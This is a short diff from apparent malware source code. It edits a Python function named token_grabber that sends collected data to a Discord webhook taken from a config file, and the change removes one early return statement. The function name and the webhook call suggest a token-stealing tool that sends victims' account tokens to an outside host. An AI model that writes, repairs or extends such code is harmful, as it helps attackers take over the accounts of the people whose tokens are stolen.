@@ -78,6 +78,5 @@ def token_grabber():
         webhook = DiscordWebhook(config.webhook_url)
         webhook.add_embed(embed)
         webhook.execute()
-        return ''
 
     return jsonify(success=True)
